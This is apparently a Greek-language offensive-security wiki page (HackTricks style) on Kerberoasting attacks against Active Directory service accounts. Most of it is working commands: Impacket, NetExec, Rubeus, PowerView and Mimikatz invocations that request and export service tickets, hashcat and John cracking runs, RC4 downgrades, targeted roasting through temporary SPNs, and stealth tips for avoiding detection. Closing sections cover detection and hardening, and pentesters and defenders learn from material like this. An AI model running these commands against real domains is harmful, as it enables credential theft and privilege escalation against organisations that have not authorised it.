# Kerberoast

{{#include ../../banners/hacktricks-training.md}}

## Kerberoast

Το Kerberoasting επικεντρώνεται στην απόκτηση TGS tickets, συγκεκριμένα εκείνων που σχετίζονται με υπηρεσίες οι οποίες εκτελούνται υπό λογαριασμούς χρηστών στο Active Directory (AD), εξαιρουμένων των λογαριασμών υπολογιστών. Η κρυπτογράφηση αυτών των tickets χρησιμοποιεί κλειδιά που προέρχονται από τους κωδικούς πρόσβασης των χρηστών, επιτρέποντας το offline cracking διαπιστευτηρίων. Η χρήση ενός λογαριασμού χρήστη ως υπηρεσίας υποδεικνύεται από μια μη κενή ιδιότητα ServicePrincipalName (SPN).

Οποιοσδήποτε authenticated domain user μπορεί να ζητήσει TGS tickets, επομένως δεν απαιτούνται ειδικά privileges.<sup>[[4]](#references)[[5]](#references)</sup>

### Βασικά σημεία

- Στοχεύει TGS tickets για υπηρεσίες που εκτελούνται υπό λογαριασμούς χρηστών (δηλαδή λογαριασμούς με ορισμένο SPN, όχι λογαριασμούς υπολογιστών).
- Τα tickets είναι κρυπτογραφημένα με ένα κλειδί που προέρχεται από τον κωδικό πρόσβασης του service account και μπορούν να γίνουν crack offline.
- Δεν απαιτούνται elevated privileges· οποιοσδήποτε authenticated account μπορεί να ζητήσει TGS tickets.

> [!WARNING]
> Τα περισσότερα public tools προτιμούν να ζητούν service tickets RC4-HMAC (etype 23), επειδή είναι ταχύτερα στο cracking από τα AES. Τα RC4 TGS hashes ξεκινούν με `$krb5tgs$23$*`, τα AES128 με `$krb5tgs$17$*` και τα AES256 με `$krb5tgs$18$*`. Ωστόσο, πολλά περιβάλλοντα μεταβαίνουν σε AES-only. Μην θεωρείτε ότι μόνο το RC4 είναι σχετικό.
> Επίσης, αποφύγετε το “spray-and-pray” roasting. Το προεπιλεγμένο kerberoast του Rubeus μπορεί να κάνει query και να ζητήσει tickets για όλα τα SPNs και είναι θορυβώδες. Κάντε πρώτα enumeration και στοχεύστε τους ενδιαφέροντες principals.

### Secrets των service accounts & κόστος κρυπτογράφησης Kerberos

Πολλές υπηρεσίες εξακολουθούν να εκτελούνται υπό λογαριασμούς χρηστών με κωδικούς πρόσβασης που διαχειρίζονται χειροκίνητα. Το KDC κρυπτογραφεί τα service tickets με κλειδιά που προέρχονται από αυτούς τους κωδικούς πρόσβασης και παραδίδει το ciphertext σε οποιονδήποτε authenticated principal, επομένως το kerberoasting παρέχει απεριόριστες offline δοκιμές χωρίς lockouts ή telemetry από το DC. Η λειτουργία κρυπτογράφησης καθορίζει το cracking budget:

| Λειτουργία | Παραγωγή κλειδιού | Τύπος κρυπτογράφησης | Κατά προσέγγιση throughput RTX 5090* | Σημειώσεις |
| --- | --- | --- | --- | --- |
| AES + PBKDF2 | PBKDF2-HMAC-SHA1 με 4.096 iterations και salt ανά principal, το οποίο δημιουργείται από το domain + SPN | etype 17/18 (`$krb5tgs$17$`, `$krb5tgs$18$`) | ~6,8 εκατομμύρια guesses/s | Το salt εμποδίζει τα rainbow tables, αλλά εξακολουθεί να επιτρέπει γρήγορο cracking σύντομων κωδικών πρόσβασης. |
| RC4 + NT hash | Ένα μόνο MD4 του κωδικού πρόσβασης (unsalted NT hash)· το Kerberos αναμειγνύει μόνο έναν confounder 8 bytes ανά ticket | etype 23 (`$krb5tgs$23$`) | ~4,18 **δισεκατομμύρια** guesses/s | ~1000× ταχύτερο από το AES· οι attackers επιβάλλουν RC4 όποτε το `msDS-SupportedEncryptionTypes` το επιτρέπει. |

*Benchmarks από τον Chick3nman, όπως αναφέρονται στην [ανάλυση του Matthew Green για το Kerberoasting](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/).<sup>[[3]](#references)</sup>

Ο confounder του RC4 τυχαιοποιεί μόνο το keystream· δεν προσθέτει επιπλέον κόστος ανά guess. Εκτός εάν τα service accounts χρησιμοποιούν τυχαία secrets (gMSA/dMSA, machine accounts ή strings που διαχειρίζονται vaults), η ταχύτητα compromise εξαρτάται αποκλειστικά από το GPU budget. Η επιβολή AES-only etypes αφαιρεί το downgrade του ενός δισεκατομμυρίου guesses ανά δευτερόλεπτο, αλλά οι αδύναμοι ανθρώπινοι κωδικοί πρόσβασης εξακολουθούν να υποκύπτουν στο PBKDF2.<sup>[[3]](#references)</sup>

### Επίθεση

#### Linux

Ένα πρακτικό end-to-end παράδειγμα που χρησιμοποιεί το NetExec για να ζητήσει roastable tickets και το Hashcat για να τα κάνει crack είναι διαθέσιμο στην αναφορά [1].<sup>[[1]](#references)</sup>
```bash
# Metasploit Framework
msf> use auxiliary/gather/get_user_spns

# Impacket — request and save roastable hashes (prompts for password)
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# With NT hash
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# Target a specific user’s SPNs only (reduce noise)
GetUserSPNs.py -request-user <samAccountName> -dc-ip <DC_IP> <DOMAIN>/<USER>

# NetExec — LDAP enumerate + dump $krb5tgs$23/$17/$18 blobs with metadata
netexec ldap <DC_FQDN> -u <USER> -p <PASS> --kerberoast kerberoast.hashes

# kerberoast by @skelsec (enumerate and roast)
# 1) Enumerate kerberoastable users via LDAP
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -o kerberoastable
# 2) Request TGS for selected SPNs and dump
kerberoast spnroast 'kerberos+password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes
```
Εργαλεία πολλαπλών δυνατοτήτων που περιλαμβάνουν ελέγχους kerberoast:
```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN> -ip <DC_IP> -u <USER> -p <PASS> -c
```
#### Windows

- Κάντε enumerate τους kerberoastable χρήστες
```powershell
# Built-in
setspn.exe -Q */*   # Focus on entries where the backing object is a user, not a computer ($)

# PowerView
Get-NetUser -SPN | Select-Object serviceprincipalname

# Rubeus stats (AES/RC4 coverage, pwd-last-set years, etc.)
.\Rubeus.exe kerberoast /stats
```
- Technique 1: Ζήτησε TGS και κάνε dump από τη μνήμη
```powershell
# Acquire a single service ticket in memory for a known SPN
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"  # e.g. MSSQLSvc/mgmt.domain.local

# Get all cached Kerberos tickets
klist

# Export tickets from LSASS (requires admin)
Invoke-Mimikatz -Command '"kerberos::list /export"'

# Convert to cracking formats
python2.7 kirbi2john.py .\some_service.kirbi > tgs.john
# Optional: convert john -> hashcat etype23 if needed
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$*\1*$\2/' tgs.john > tgs.hashcat
```
- Technique 2: Automatic tools
```powershell
# PowerView — single SPN to hashcat format
Request-SPNTicket -SPN "<SPN>" -Format Hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
# PowerView — all user SPNs -> CSV
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus — default kerberoast (be careful, can be noisy)
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
# Rubeus — target a single account
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast
# Rubeus — target admins only
.\Rubeus.exe kerberoast /ldapfilter:'(admincount=1)' /nowrap
```
> [!WARNING]
> Ένα TGS request δημιουργεί το Windows Security Event 4769 (Ζητήθηκε ticket υπηρεσίας Kerberos).

### OPSEC και περιβάλλοντα μόνο με AES

- Ζητήστε σκόπιμα RC4 για accounts χωρίς AES:
- Rubeus: `/rc4opsec` χρησιμοποιεί tgtdeleg για την απαρίθμηση accounts χωρίς AES και ζητά RC4 service tickets.
- Rubeus: `/tgtdeleg` μαζί με kerberoast ενεργοποιεί επίσης RC4 requests όπου είναι δυνατό.<sup>[[6]](#references)</sup>
- Κάντε roast σε accounts μόνο με AES αντί να αποτυγχάνετε σιωπηλά:
- Rubeus: `/aes` απαριθμεί accounts με ενεργοποιημένο AES και ζητά AES service tickets (etype 17/18).
- Αν έχετε ήδη ένα TGT (PTT ή από ένα .kirbi), μπορείτε να χρησιμοποιήσετε `/ticket:<blob|path>` μαζί με `/spn:<SPN>` ή `/spns:<file>` και να παραλείψετε το LDAP.
- Στόχευση, throttling και λιγότερος θόρυβος:
- Χρησιμοποιήστε `/user:<sam>`, `/spn:<spn>`, `/resultlimit:<N>`, `/delay:<ms>` και `/jitter:<1-100>`.
- Φιλτράρετε για πιθανά αδύναμα passwords χρησιμοποιώντας `/pwdsetbefore:<MM-dd-yyyy>` (παλαιότερα passwords) ή στοχεύστε privileged OUs με `/ou:<DN>`.<sup>[[8]](#references)</sup>

Παραδείγματα (Rubeus):
```powershell
# Kerberoast only AES-enabled accounts
.\Rubeus.exe kerberoast /aes /outfile:hashes.aes
# Request RC4 for accounts without AES (downgrade via tgtdeleg)
.\Rubeus.exe kerberoast /rc4opsec /outfile:hashes.rc4
# Roast a specific SPN with an existing TGT from a non-domain-joined host
.\Rubeus.exe kerberoast /ticket:C:\\temp\\tgt.kirbi /spn:MSSQLSvc/sql01.domain.local
```
### Cracking
```bash
# John the Ripper
john --format=krb5tgs --wordlist=wordlist.txt hashes.kerberoast

# Hashcat
# RC4-HMAC (etype 23)
hashcat -m 13100 -a 0 hashes.rc4 wordlist.txt
# AES128-CTS-HMAC-SHA1-96 (etype 17)
hashcat -m 19600 -a 0 hashes.aes128 wordlist.txt
# AES256-CTS-HMAC-SHA1-96 (etype 18)
hashcat -m 19700 -a 0 hashes.aes256 wordlist.txt
```
### Persistence / Abuse

Εάν ελέγχετε ή μπορείτε να τροποποιήσετε έναν λογαριασμό, μπορείτε να τον κάνετε kerberoastable προσθέτοντας ένα SPN:
```powershell
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='fake/WhateverUn1Que'} -Verbose
```
Υποβάθμιση ενός account για ενεργοποίηση του RC4, ώστε το cracking να είναι ευκολότερο (απαιτούνται write privileges στο target object):
```powershell
# Allow only RC4 (value 4) — very noisy/risky from a blue-team perspective
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=4}
# Mixed RC4+AES (value 28)
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=28}
```
#### Targeted Kerberoast μέσω GenericWrite/GenericAll σε user (προσωρινό SPN)

Όταν το BloodHound δείχνει ότι έχετε control πάνω σε ένα user object (π.χ. GenericWrite/GenericAll), μπορείτε αξιόπιστα να κάνετε “targeted-roast” στον συγκεκριμένο user, ακόμη και αν δεν έχει επί του παρόντος κανένα SPN:<sup>[[9]](#references)</sup>

- Προσθέστε ένα προσωρινό SPN στον controlled user ώστε να μπορεί να γίνει roast.
- Ζητήστε ένα TGS-REP κρυπτογραφημένο με RC4 (etype 23) για αυτό το SPN, ώστε να διευκολύνετε το cracking.
- Κάντε crack το `$krb5tgs$23$...` hash με το hashcat.
- Αφαιρέστε το SPN για να μειώσετε το footprint.

Windows (PowerView/Rubeus):
```powershell
# Add temporary SPN on the target user
Set-DomainObject -Identity <targetUser> -Set @{serviceprincipalname='fake/TempSvc-<rand>'} -Verbose

# Request RC4 TGS for that user (single target)
.\Rubeus.exe kerberoast /user:<targetUser> /nowrap /rc4

# Remove SPN afterwards
Set-DomainObject -Identity <targetUser> -Clear serviceprincipalname -Verbose
```
Linux εντολή μίας γραμμής (το targetedKerberoast.py αυτοματοποιεί την προσθήκη SPN -> request TGS (etype 23) -> αφαίρεση SPN):<sup>[[2]](#references)</sup>
```bash
targetedKerberoast.py -d '<DOMAIN>' -u <WRITER_SAM> -p '<WRITER_PASS>'
```
Κάντε crack το output με hashcat autodetect (mode 13100 για `$krb5tgs$23$`):
```bash
hashcat <outfile>.hash /path/to/rockyou.txt
```
Σημειώσεις ανίχνευσης: η προσθήκη/αφαίρεση SPNs προκαλεί αλλαγές στον κατάλογο (Event ID 5136/4738 στον χρήστη-στόχο) και το αίτημα TGS δημιουργεί Event ID 4769. Εξετάστε το throttling και τον καθαρισμό των prompts.

Μπορείτε να βρείτε χρήσιμα εργαλεία για επιθέσεις kerberoast εδώ: https://github.com/nidem/kerberoast

Αν δείτε αυτό το σφάλμα από Linux: `Kerberos SessionError: KRB_AP_ERR_SKEW (Clock skew too great)` οφείλεται σε απόκλιση της τοπικής ώρας. Συγχρονίστε με το DC:

- `ntpdate <DC_IP>` (deprecated σε ορισμένες διανομές)
- `rdate -n <DC_IP>`

### Kerberoast χωρίς λογαριασμό domain (AS-requested STs)

Τον Σεπτέμβριο του 2022, ο Charlie Clark έδειξε ότι, αν ένα principal δεν απαιτεί pre-authentication, είναι δυνατή η λήψη ενός service ticket μέσω ενός crafted KRB_AS_REQ, με τροποποίηση του sname στο σώμα του request, ώστε να λαμβάνεται ουσιαστικά ένα service ticket αντί για TGT. Αυτό αντικατοπτρίζει το AS-REP roasting και δεν απαιτεί έγκυρα domain credentials.

Δείτε λεπτομέρειες: το write-up της Semperis «New Attack Paths: AS-requested STs».<sup>[[10]](#references)</sup>

> [!WARNING]
> Πρέπει να παρέχετε μια λίστα χρηστών, επειδή χωρίς έγκυρα credentials δεν μπορείτε να κάνετε query στο LDAP με αυτή την τεχνική.

Linux

- Impacket (PR #1413):
```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile users.txt -dc-host dc.domain.local domain.local/
```
Windows

- Rubeus (PR #139):
```powershell
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:domain.local /dc:dc.domain.local /nopreauth:NO_PREAUTH_USER /spn:TARGET_SERVICE
```
Σχετικά

Αν στοχεύετε χρήστες που είναι ευάλωτοι σε AS-REP roast, δείτε επίσης:

{{#ref}}
asreproast.md
{{#endref}}

### Ανίχνευση

Το Kerberoasting μπορεί να είναι stealthy. Αναζητήστε το Event ID 4769 από DCs και εφαρμόστε φίλτρα για να μειώσετε τον θόρυβο:

- Εξαιρέστε το όνομα υπηρεσίας `krbtgt` και ονόματα υπηρεσιών που τελειώνουν σε `$` (λογαριασμοί υπολογιστών).
- Εξαιρέστε αιτήματα από machine accounts (`*$$@*`).
- Μόνο επιτυχημένα αιτήματα (Failure Code `0x0`).
- Παρακολουθήστε τους τύπους κρυπτογράφησης: RC4 (`0x17`), AES128 (`0x11`), AES256 (`0x12`). Μην δημιουργείτε alert μόνο για το `0x17`.

Παράδειγμα PowerShell triage:
```powershell
Get-WinEvent -FilterHashtable @{Logname='Security'; ID=4769} -MaxEvents 1000 |
Where-Object {
($_.Message -notmatch 'krbtgt') -and
($_.Message -notmatch '\$$') -and
($_.Message -match 'Failure Code:\s+0x0') -and
($_.Message -match 'Ticket Encryption Type:\s+(0x17|0x12|0x11)') -and
($_.Message -notmatch '\$@')
} |
Select-Object -ExpandProperty Message
```
Πρόσθετες ιδέες:

- Καθορίστε baseline για τη φυσιολογική χρήση SPN ανά host/user και δημιουργήστε alert για μεγάλα bursts διαφορετικών αιτημάτων SPN από έναν principal.
- Εντοπίστε ασυνήθιστη χρήση RC4 σε domains που έχουν hardened με AES.

### Mitigation / Hardening

- Χρησιμοποιήστε gMSA/dMSA ή machine accounts για services. Τα managed accounts διαθέτουν τυχαίους κωδικούς πρόσβασης 120+ χαρακτήρων και πραγματοποιούν αυτόματο rotation, καθιστώντας το offline cracking πρακτικά ανέφικτο.<sup>[[7]](#references)</sup>
- Επιβάλετε AES στα service accounts ορίζοντας το `msDS-SupportedEncryptionTypes` μόνο σε AES (decimal 24 / hex 0x18) και στη συνέχεια πραγματοποιήστε rotation του κωδικού πρόσβασης, ώστε να παραχθούν AES keys.<sup>[[7]](#references)</sup>
- Όπου είναι δυνατό, απενεργοποιήστε το RC4 στο περιβάλλον σας και παρακολουθείτε τις απόπειρες χρήσης RC4. Στα DCs μπορείτε να χρησιμοποιήσετε την τιμή registry `DefaultDomainSupportedEncTypes` για να καθορίσετε τις προεπιλογές για accounts στα οποία δεν έχει οριστεί το `msDS-SupportedEncryptionTypes`. Κάντε εκτενείς δοκιμές.
- Αφαιρέστε τα μη απαραίτητα SPNs από user accounts.<sup>[[7]](#references)</sup>
- Χρησιμοποιήστε μεγάλους, τυχαίους κωδικούς πρόσβασης service accounts (25+ χαρακτήρες), εάν τα managed accounts δεν είναι εφικτά. Απαγορεύστε τα common passwords και πραγματοποιείτε τακτικά audit.<sup>[[7]](#references)</sup>

## References

- [1] [HTB: Breach – NetExec LDAP kerberoast + cracking hash με hashcat στην πράξη](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [2] [ShutdownRepo/targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast)
- [3] [Matthew Green – Kerberoasting: Επιθέσεις χαμηλής τεχνικής και υψηλού αντίκτυπου από το legacy Kerberos Crypto (2025-09-10)](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/)
- [4] [Kerberos (II): Πώς να επιτεθείτε στο Kerberos;](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [5] [ired.team – Active Directory Kerberos Abuse: T1208 Kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
- [6] [ired.team – Kerberoasting: Αίτηση για RC4 Encrypted TGS όταν είναι ενεργοποιημένο το AES](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)
- [7] [Microsoft Security Blog (2024-10-11) – Οδηγίες της Microsoft για τον περιορισμό του Kerberoasting](https://www.microsoft.com/en-us/security/blog/2024/10/11/microsofts-guidance-to-help-mitigate-kerberoasting/)
- [8] [SpecterOps – Τεκμηρίωση εντολών kerberoast του Rubeus](https://docs.specterops.io/ghostpack-docs/Rubeus-mdx/commands/roasting/kerberoast)
- [9] [HTB: Delegate — Διαπιστευτήρια SYSVOL → Targeted Kerberoast → Unconstrained Delegation → DCSync σε DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)
- [10] [Semperis – Νέα Attack Paths; AS Requested Service Tickets (Charlie Clark, Sept 2022)](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/)
{{#include ../../banners/hacktricks-training.md}}
